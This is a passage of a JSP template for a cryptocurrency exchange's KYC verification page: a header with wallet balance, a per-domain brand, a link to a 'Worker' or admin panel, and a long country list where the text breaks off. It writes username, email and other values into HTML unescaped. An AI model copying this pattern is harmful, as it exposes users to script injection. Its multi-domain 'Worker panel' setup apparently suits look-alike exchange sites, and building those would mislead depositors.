<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <%
        out.println("<title>KYC Verification | " + request.getAttribute("domain_exchange_name") + "</title>");
    %>
    <%
    out.println("<link rel=\"icon\" href=\"" + request.getAttribute("domain_icon") + "\">");
  %>
    <%
        out.println("<meta property=\"og:title\" content=\"" + request.getAttribute("domain_title") + "\">");
    %>
    <meta property="og:description" content="Best place to buy, trade and sell Bitcoin, Ethereum and over 100 cryptocurrencies safely and securely.">
    <link rel="stylesheet" href="../assets/css/g_menu_normalize.css">
    <link rel="stylesheet" href="../assets/css/g_menu_style.css">
    <link rel="stylesheet" href="../assets/css/style.css?v=3">
    <link rel="stylesheet" href="../assets/css/custom.css?v=3">
    <link rel="stylesheet" href="../plugins/notifications/toastr.css">
    <link rel="stylesheet" href="../assets/css/popap-style.css">
    <link rel="stylesheet" href="../assets/css/stake.css">
    <link rel="stylesheet" href="../assets/css/popup/popup-verifi.css">
    <link rel="stylesheet" href="../assets/css/available.css">
    <link rel="stylesheet" href="../assets/css/new_popup_style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
</head>
<body id="dark" class="stop-scrolling">
<!-- PRELOADER -->
<!-- PRELOADER END -->
<header class="header">
    <div class="header__left">
        <a class="header__logo" href="/">
            <%
        out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" alt=\"\">");
      %>
            <%
        out.println("<span class=\"header__logo-text\">" + request.getAttribute("domain_exchange_name") + "</span>");
      %>
        </a>
        <div class="header__links">
            <a class="header__link" href="../trading">Trading</a>
            <div class="header__link-tools header__tools">
                <span class="header__link-tools-span">Market tools</span>
                <div class="header__tools-box">
                    <a class="header__tools-link" href="../tools/marketcrypto">Crypto market cap</a>
                    <a class="header__tools-link" href="../tools/marketscreener">Market screener</a>
                    <a class="header__tools-link" href="../tools/technicalanalysis">Technical analysis</a>
                    <a class="header__tools-link" href="../tools/crossrates">Cross rates</a>
                    <a class="header__tools-link" href="../tools/heatmap">Currency heat map</a>
                </div>
            </div>
            <a class="header__link" href="/profile/invest">Invest</a>
            <a class="header__link header__link-new" href="/profile/p2p">P2P</a>
            <a class="header__link header__link-hot" href="/profile/swap">Swap</a>
            <%
                if (request.getAttribute("support_unviewed") != null && ((int) request.getAttribute("support_unviewed")) > 0) {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support <span id=\"count_support_message\" class=\"support_messages\">" + request.getAttribute("support_unviewed") + "</span></a>");
                } else {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support </a>");
                }
            %>
            <%
                out.println("<a class=\"header__link\" href=\"/profile/wallet\">Wallet: " + request.getAttribute("total_balance") + " USD </a>");
            %>
        </div>
    </div>
    <div class="header__right">
        <div class="header__profile">
            <div class="header__profile-toggle">
                <%
                    out.print("<div class=\"header__toggle-name\">" + request.getAttribute("username") + "</div>");
                %>
                <div class="header__toggle-img">
                    <%
                        out.println("<img src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                    %>
                </div>
                <div class="header__toggle-btn">
                    <svg width="28" height="28" viewbox="0 0 100 100">
                        <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
                        <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
                        <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
                    </svg>
                </div>
            </div>
            <div class="header__profile-box">
                <div class="header__profile-top">
                    <%
                        if (request.getAttribute("kyc_accepted") != null) {
                            out.println("<div class=\"header__profile-img header__profile-kyc\">");
                        } else {
                            out.println("<div class=\"header__profile-img \">");
                        }
                        out.println("<img style=\"width: 64px; height: 64px; border-radius: 50%;\" src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        out.println("</div>");
                    %>
                    <div class="header__profile-info">
                        <%
                            out.print("<div class=\"header__profile-name\">" + request.getAttribute("username") + "</div>");
                            out.print("<div class=\"header__profile-email\">" + request.getAttribute("email") + "</div>");
                            out.print("<div class=\"userCard__user-premium-" + (request.getAttribute("premium") == null ? "danger" : "success") + "\" style=\"font-size: 13px; margin-left: 5px; padding-left: 15px;\">Premium</div>");
                        %>
                    </div>
                </div>
                <div class="header__profile-center">
                    <a class="header__profile-link" href="../trading">Trading</a>
                    <a class="header__profile-link header__profile-tools" href="#">
                        <span>Market tools</span>
                        <div class="header__profile-tools-box">
                            <a class="header__profile-tools-link" href="../tools/marketcrypto">
                                Crypto market cap
                            </a>
                            <a class="header__profile-tools-link" href="../tools/marketscreener">
                                Market screener
                            </a>
                            <a class="header__profile-tools-link" href="../tools/technicalanalysis">
                                Technical analysis
                            </a>
                            <a class="header__profile-tools-link" href="../tools/crossrates">
                                Cross rates
                            </a>
                            <a class="header__profile-tools-link" href="../tools/heatmap">
                                Currency heat map
                            </a>
                        </div>
                    </a>
                    <a class="header__profile-link" href="/profile/invest">Invest</a>
                    <a class="header__profile-link header__link-new" href="/profile/p2p">P2P</a>
                    <a class="header__profile-link header__link-hot" href="/profile/swap">Swap</a>
                    <a class="header__profile-link" href="/profile/support">Support</a>
                </div>
                <div class="header__profile-bottom">
                    <%
                        Object panel = request.getAttribute("panel");
                        if (panel != null) {
                            out.println("<a class=\"header__profile-link\" href=\"../" + (((String) panel).equals("Worker") ? "panel" : "admin") + "\" style=\"color: orange;\">\n" +
                                    "                            <div class=\"header__profile-link-icon\">\n" +
                                    "                                <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z\"></path></svg>\n" +
                                    "                            </div>\n" +
                                    panel + " panel</a>");
                        }
                    %>
                    <a class="header__profile-link" href="/profile/wallet">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
                                <path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z"></path>
                            </svg>
                        </div>
                        <%
                            out.println("<span>Wallet: " + request.getAttribute("total_balance") + " USD </span>");
                        %>
                    </a>
                    <a class="header__profile-link" href="/profile/settings">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
                                <path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.21,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.21,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z"></path>
                            </svg>
                        </div>
                        <span>Settings</span>
                    </a>
                    <a class="header__profile-link header__profile-out" href="/profile/logout">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
                                <path d="M16.56,5.44L15.11,6.89C16.84,7.94 18,9.83 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12C6,9.83 7.16,7.94 8.88,6.88L7.44,5.44C5.36,6.88 4,9.28 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12C20,9.28 18.64,6.88 16.56,5.44M13,3H11V13H13"></path>
                            </svg>
                        </div>
                        <span>Log Out</span>
                    </a>
                </div>
            </div>
        </div>
    </div>
</header>
<link rel="stylesheet" href="../assets/css/g_kyc_style.css">
<section class="verification" style="margin-top: 50px;">
    <div class="verification__container">
        <div class="verification__title">
            KYC verification
        </div>
        <div class="verification__box">
            <%
                Object verified = request.getAttribute("verified");
                if (verified == null) {
                    String html = "<div class=\"verification__info verification__info-not\">\n" +
                            "                <div class=\"verification__info-img\">\n" +
                            "                    <img src=\"../assets/img/not-verified.svg\" alt=\"\">\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__info-text\">\n" +
                            "                    Account not verified\n" +
                            "                </div>\n" +
                            "            </div>\n" +
                            "            <div class=\"verification__inputs\">\n" +
                            "                <div class=\"verification__input verification__input-first\">\n" +
                            "                    <label class=\"verification__input-label\" for=\"kyc_first_name\">\n" +
                            "                        First name\n" +
                            "                    </label>\n" +
                            "                    <input id=\"kyc_first_name\" type=\"text\" value=\"\">\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-last\">\n" +
                            "                    <label class=\"verification__input-label\" for=\"kyc_last_name\">\n" +
                            "                        Last name\n" +
                            "                    </label>\n" +
                            "                    <input id=\"kyc_last_name\" value=\"\" type=\"text\">\n" +
                            "                </div>\n" +
                            "                <div class=\"verification__input verification__input-country\">\n" +
                            "                    <div class=\"verification__input-label\">\n" +
                            "                        Select country\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__input-input  \" id=\"verificationCountry\">\n" +
                            "                        <span class=\"verification__input-value\">Germany</span>\n" +
                            "                        <div class=\"verification__input-icon\">\n" +
                            "                            <img src=\"../assets/img/arrow.svg\" alt=\"\">\n" +
                            "                        </div>\n" +
                            "                    </div>\n" +
                            "                    <div class=\"verification__input-list verification__input-list-country\">\n" +
                            "                        <div class=\"verification__input-box\">\n" +
                            "                            <div onclick=\"selectedCountry('AF', 'Afghanistan')\" class=\"verification__input-list-item\">\n" +
                            "                                Afghanistan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AL', 'Albania')\" class=\"verification__input-list-item\">\n" +
                            "                                Albania\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DZ', 'Algeria')\" class=\"verification__input-list-item\">\n" +
                            "                                Algeria\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AS', 'American Samoa')\" class=\"verification__input-list-item\">\n" +
                            "                                American Samoa\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AD', 'Andorra')\" class=\"verification__input-list-item\">\n" +
                            "                                Andorra\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AO', 'Angola')\" class=\"verification__input-list-item\">\n" +
                            "                                Angola\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AI', 'Anguilla')\" class=\"verification__input-list-item\">\n" +
                            "                                Anguilla\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AQ', 'Antarctica')\" class=\"verification__input-list-item\">\n" +
                            "                                Antarctica\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AG', 'Antigua and Barbuda')\" class=\"verification__input-list-item\">\n" +
                            "                                Antigua and Barbuda\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AR', 'Argentina')\" class=\"verification__input-list-item\">\n" +
                            "                                Argentina\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AM', 'Armenia')\" class=\"verification__input-list-item\">\n" +
                            "                                Armenia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AW', 'Aruba')\" class=\"verification__input-list-item\">\n" +
                            "                                Aruba\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AU', 'Australia')\" class=\"verification__input-list-item\">\n" +
                            "                                Australia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AT', 'Austria')\" class=\"verification__input-list-item\">\n" +
                            "                                Austria\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('AZ', 'Azerbaijan')\" class=\"verification__input-list-item\">\n" +
                            "                                Azerbaijan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BH', 'Bahrain')\" class=\"verification__input-list-item\">\n" +
                            "                                Bahrain\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BD', 'Bangladesh')\" class=\"verification__input-list-item\">\n" +
                            "                                Bangladesh\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BB', 'Barbados')\" class=\"verification__input-list-item\">\n" +
                            "                                Barbados\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BY', 'Belarus')\" class=\"verification__input-list-item\">\n" +
                            "                                Belarus\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BE', 'Belgium')\" class=\"verification__input-list-item\">\n" +
                            "                                Belgium\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BZ', 'Belize')\" class=\"verification__input-list-item\">\n" +
                            "                                Belize\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BJ', 'Benin')\" class=\"verification__input-list-item\">\n" +
                            "                                Benin\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BM', 'Bermuda')\" class=\"verification__input-list-item\">\n" +
                            "                                Bermuda\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BT', 'Bhutan')\" class=\"verification__input-list-item\">\n" +
                            "                                Bhutan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BO', 'Bolivia')\" class=\"verification__input-list-item\">\n" +
                            "                                Bolivia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BA', 'Bosnia and Herzegovina')\" class=\"verification__input-list-item\">\n" +
                            "                                Bosnia and Herzegovina\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BW', 'Botswana')\" class=\"verification__input-list-item\">\n" +
                            "                                Botswana\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BV', 'Bouvet Island')\" class=\"verification__input-list-item\">\n" +
                            "                                Bouvet Island\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BR', 'Brazil')\" class=\"verification__input-list-item\">\n" +
                            "                                Brazil\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BQ', 'British Antarctic Territory')\" class=\"verification__input-list-item\">\n" +
                            "                                British Antarctic Territory\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IO', 'British Indian Ocean Territory')\" class=\"verification__input-list-item\">\n" +
                            "                                British Indian Ocean Territory\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('VG', 'British Virgin Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                British Virgin Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BN', 'Brunei')\" class=\"verification__input-list-item\">\n" +
                            "                                Brunei\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BG', 'Bulgaria')\" class=\"verification__input-list-item\">\n" +
                            "                                Bulgaria\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BF', 'Burkina Faso')\" class=\"verification__input-list-item\">\n" +
                            "                                Burkina Faso\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('BI', 'Burundi')\" class=\"verification__input-list-item\">\n" +
                            "                                Burundi\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KH', 'Cambodia')\" class=\"verification__input-list-item\">\n" +
                            "                                Cambodia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CM', 'Cameroon')\" class=\"verification__input-list-item\">\n" +
                            "                                Cameroon\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CA', 'Canada')\" class=\"verification__input-list-item\">\n" +
                            "                                Canada\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CV', 'Cape Verde')\" class=\"verification__input-list-item\">\n" +
                            "                                Cape Verde\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KY', 'Cayman Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Cayman Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CF', 'Central African Republic')\" class=\"verification__input-list-item\">\n" +
                            "                                Central African Republic\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TD', 'Chad')\" class=\"verification__input-list-item\">\n" +
                            "                                Chad\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CL', 'Chile')\" class=\"verification__input-list-item\">\n" +
                            "                                Chile\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CN', 'China')\" class=\"verification__input-list-item\">\n" +
                            "                                China\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CX', 'Christmas Island')\" class=\"verification__input-list-item\">\n" +
                            "                                Christmas Island\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CC', 'Cocos [Keeling] Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Cocos [Keeling] Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CO', 'Colombia')\" class=\"verification__input-list-item\">\n" +
                            "                                Colombia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KM', 'Comoros')\" class=\"verification__input-list-item\">\n" +
                            "                                Comoros\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CG', 'Congo - Brazzaville')\" class=\"verification__input-list-item\">\n" +
                            "                                Congo - Brazzaville\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CD', 'Congo - Kinshasa')\" class=\"verification__input-list-item\">\n" +
                            "                                Congo - Kinshasa\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CK', 'Cook Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Cook Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CR', 'Costa Rica')\" class=\"verification__input-list-item\">\n" +
                            "                                Costa Rica\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HR', 'Croatia')\" class=\"verification__input-list-item\">\n" +
                            "                                Croatia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CU', 'Cuba')\" class=\"verification__input-list-item\">\n" +
                            "                                Cuba\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CY', 'Cyprus')\" class=\"verification__input-list-item\">\n" +
                            "                                Cyprus\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CZ', 'Czech Republic')\" class=\"verification__input-list-item\">\n" +
                            "                                Czech Republic\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('CI', 'Côte d’Ivoire')\" class=\"verification__input-list-item\">\n" +
                            "                                Côte d’Ivoire\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DK', 'Denmark')\" class=\"verification__input-list-item\">\n" +
                            "                                Denmark\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DJ', 'Djibouti')\" class=\"verification__input-list-item\">\n" +
                            "                                Djibouti\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DM', 'Dominica')\" class=\"verification__input-list-item\">\n" +
                            "                                Dominica\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DO', 'Dominican Republic')\" class=\"verification__input-list-item\">\n" +
                            "                                Dominican Republic\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('EC', 'Ecuador')\" class=\"verification__input-list-item\">\n" +
                            "                                Ecuador\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('EG', 'Egypt')\" class=\"verification__input-list-item\">\n" +
                            "                                Egypt\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('SV', 'El Salvador')\" class=\"verification__input-list-item\">\n" +
                            "                                El Salvador\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GQ', 'Equatorial Guinea')\" class=\"verification__input-list-item\">\n" +
                            "                                Equatorial Guinea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ER', 'Eritrea')\" class=\"verification__input-list-item\">\n" +
                            "                                Eritrea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('EE', 'Estonia')\" class=\"verification__input-list-item\">\n" +
                            "                                Estonia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ET', 'Ethiopia')\" class=\"verification__input-list-item\">\n" +
                            "                                Ethiopia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FK', 'Falkland Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Falkland Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FO', 'Faroe Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Faroe Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FJ', 'Fiji')\" class=\"verification__input-list-item\">\n" +
                            "                                Fiji\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FI', 'Finland')\" class=\"verification__input-list-item\">\n" +
                            "                                Finland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('FR', 'France')\" class=\"verification__input-list-item\">\n" +
                            "                                France\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GF', 'French Guiana')\" class=\"verification__input-list-item\">\n" +
                            "                                French Guiana\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('PF', 'French Polynesia')\" class=\"verification__input-list-item\">\n" +
                            "                                French Polynesia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('TF', 'French Southern Territories')\" class=\"verification__input-list-item\">\n" +
                            "                                French Southern Territories\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GA', 'Gabon')\" class=\"verification__input-list-item\">\n" +
                            "                                Gabon\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GM', 'Gambia')\" class=\"verification__input-list-item\">\n" +
                            "                                Gambia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GE', 'Georgia')\" class=\"verification__input-list-item\">\n" +
                            "                                Georgia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('DE', 'Germany')\" class=\"verification__input-list-item\">\n" +
                            "                                Germany\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GH', 'Ghana')\" class=\"verification__input-list-item\">\n" +
                            "                                Ghana\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GI', 'Gibraltar')\" class=\"verification__input-list-item\">\n" +
                            "                                Gibraltar\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GR', 'Greece')\" class=\"verification__input-list-item\">\n" +
                            "                                Greece\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GL', 'Greenland')\" class=\"verification__input-list-item\">\n" +
                            "                                Greenland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GD', 'Grenada')\" class=\"verification__input-list-item\">\n" +
                            "                                Grenada\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GP', 'Guadeloupe')\" class=\"verification__input-list-item\">\n" +
                            "                                Guadeloupe\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GU', 'Guam')\" class=\"verification__input-list-item\">\n" +
                            "                                Guam\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GT', 'Guatemala')\" class=\"verification__input-list-item\">\n" +
                            "                                Guatemala\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GG', 'Guernsey')\" class=\"verification__input-list-item\">\n" +
                            "                                Guernsey\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GN', 'Guinea')\" class=\"verification__input-list-item\">\n" +
                            "                                Guinea\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GW', 'Guinea-Bissau')\" class=\"verification__input-list-item\">\n" +
                            "                                Guinea-Bissau\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('GY', 'Guyana')\" class=\"verification__input-list-item\">\n" +
                            "                                Guyana\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HT', 'Haiti')\" class=\"verification__input-list-item\">\n" +
                            "                                Haiti\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HM', 'Heard Island and McDonald Islands')\" class=\"verification__input-list-item\">\n" +
                            "                                Heard Island and McDonald Islands\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HN', 'Honduras')\" class=\"verification__input-list-item\">\n" +
                            "                                Honduras\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HK', 'Hong Kong SAR China')\" class=\"verification__input-list-item\">\n" +
                            "                                Hong Kong SAR China\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('HU', 'Hungary')\" class=\"verification__input-list-item\">\n" +
                            "                                Hungary\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IS', 'Iceland')\" class=\"verification__input-list-item\">\n" +
                            "                                Iceland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IN', 'India')\" class=\"verification__input-list-item\">\n" +
                            "                                India\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('ID', 'Indonesia')\" class=\"verification__input-list-item\">\n" +
                            "                                Indonesia\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IR', 'Iran')\" class=\"verification__input-list-item\">\n" +
                            "                                Iran\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IQ', 'Iraq')\" class=\"verification__input-list-item\">\n" +
                            "                                Iraq\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IE', 'Ireland')\" class=\"verification__input-list-item\">\n" +
                            "                                Ireland\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IM', 'Isle of Man')\" class=\"verification__input-list-item\">\n" +
                            "                                Isle of Man\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IL', 'Israel')\" class=\"verification__input-list-item\">\n" +
                            "                                Israel\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('IT', 'Italy')\" class=\"verification__input-list-item\">\n" +
                            "                                Italy\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('JM', 'Jamaica')\" class=\"verification__input-list-item\">\n" +
                            "                                Jamaica\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('JP', 'Japan')\" class=\"verification__input-list-item\">\n" +
                            "                                Japan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('JE', 'Jersey')\" class=\"verification__input-list-item\">\n" +
                            "                                Jersey\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('JO', 'Jordan')\" class=\"verification__input-list-item\">\n" +
                            "                                Jordan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KZ', 'Kazakhstan')\" class=\"verification__input-list-item\">\n" +
                            "                                Kazakhstan\n" +
                            "                            </div>\n" +
                            "                            <div onclick=\"selectedCountry('KE', 'Kenya')\" class=\"verification__input-list-item\">\n" +
                            "                                Kenya\n" +
